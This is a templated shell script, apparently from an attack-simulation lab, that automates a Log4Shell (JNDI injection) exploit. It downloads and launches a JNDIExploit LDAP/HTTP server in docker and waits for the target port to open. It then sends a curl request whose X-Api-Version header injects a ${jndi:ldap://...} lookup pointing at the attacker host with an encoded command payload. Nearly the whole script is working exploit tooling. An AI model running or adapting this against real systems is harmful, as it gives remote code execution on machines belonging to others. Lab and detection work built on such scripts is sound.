JNDIEXPLOIT_URL="${jndiexploit_url}"
NAME="${name}"
IMAGE="${image}"
ATTACKER_IP="${attacker_ip}"
ATTACKER_HTTP_PORT=${attacker_http_port}
ATTACKER_LDAP_PORT=${attacker_ldap_port}
TARGET_IP=${target_ip}
TARGET_PORT=${target_port}
EXEC_TYPE="${exec_type}"
BASE64_PAYLOAD="${base64_payload}"
LOGFILE=/tmp/jdniexploit.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
truncate -s 0 $LOGFILE
check_apt() {
    pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
    log "Waiting for apt to be available..."
    sleep 10
done
log "Checking for docker..."
while ! which docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(which docker)"

TIMEOUT=600
START_TIME=$(date +%s)
# Check if $ATTACKER_IP is an IP address
if [[ $ATTACKER_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    log "server is set to IP address $ATTACKER_IP, no need to resolve DNS"
else
    log "checking dns resolution: $ATTACKER_IP"
    while true; do
        IP=$(dig +short $ATTACKER_IP)
        if [ -z "$IP" ]; then  # If $IP is empty, the domain hasn't resolved yet
            CURRENT_TIME=$(date +%s)
            ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
            if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                echo "DNS resolution for $ATTACKER_IP timed out after $TIMEOUT seconds"
                exit 1
            fi
            sleep 1
        else
            echo "$ATTACKER_IP resolved to $IP"
            break
        fi
    done
fi
if [[ `sudo docker ps | grep ${name}` ]]; then docker stop ${name}; fi
docker run -d --name $NAME --rm -p $ATTACKER_HTTP_PORT:$ATTACKER_HTTP_PORT -p $ATTACKER_LDAP_PORT:$ATTACKER_LDAP_PORT $IMAGE bash -c "wget $JNDIEXPLOIT_URL && base64 -d jndi.base64 > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip 0.0.0.0 --httpPort $ATTACKER_HTTP_PORT --ldapPort $ATTACKER_LDAP_PORT" >> $LOGFILE 2>&1
#docker run -d --rm --name=jndiexploit -p $ATTACKER_HTTP_PORT:$ATTACKER_HTTP_PORT -p $ATTACKER_LDAP_PORT:$ATTACKER_LDAP_PORT -e LDAP_PORT=$ATTACKER_LDAP_PORT -e HTTP_PORT=$ATTACKER_HTTP_PORT sickcodes/jndiexploit 
docker ps -a >> $LOGFILE 2>&1
log "payload: curl --verbose $TARGET_IP:$TARGET_PORT -H \"X-Api-Version: \$${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}\""
log "checking target: $TARGET_IP:$TARGET_PORT"
while ! nc -z -w 5 -vv $TARGET_IP $TARGET_PORT > /dev/null; do
    log "failed check - waiting for target";
    sleep 30;
done;
log "target available - sending payload";
sleep 5;
curl --verbose $TARGET_IP:$TARGET_PORT -H "X-Api-Version: \$${jndi:ldap://$ATTACKER_IP:$ATTACKER_LDAP_PORT/$EXEC_TYPE/$BASE64_PAYLOAD}" >> $LOGFILE 2>&1;
log "payload sent sleeping for 30 minutes"
sleep 1795
docker stop $NAME
log "done";
